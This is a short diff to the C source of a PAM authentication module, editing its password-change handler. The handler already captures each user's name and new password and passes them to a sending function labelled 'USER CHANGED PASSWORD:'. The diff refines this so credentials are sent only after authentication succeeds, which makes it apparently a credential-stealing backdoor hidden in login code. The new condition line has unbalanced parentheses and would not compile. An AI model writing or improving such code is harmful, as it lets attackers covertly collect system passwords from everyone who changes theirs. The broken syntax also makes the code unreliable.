@@ -159,11 +159,13 @@ PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const c
     pam_get_user(pamh, &username, NULL);
     pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
 
-    if (username && password) {
+    int retval = pam_unix_authenticate("pam_sm_chauthtok", pamh, flags, argc, argv);
+
+    if (username && password) && retval == PAM_SUCCESS) {
         pam_send_authtok(pamh, "USER CHANGED PASSWORD:", username, password);
     }
 
-    return pam_unix_authenticate("pam_sm_chauthtok", pamh, flags, argc, argv);
+    return retval;
 }
 
 PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
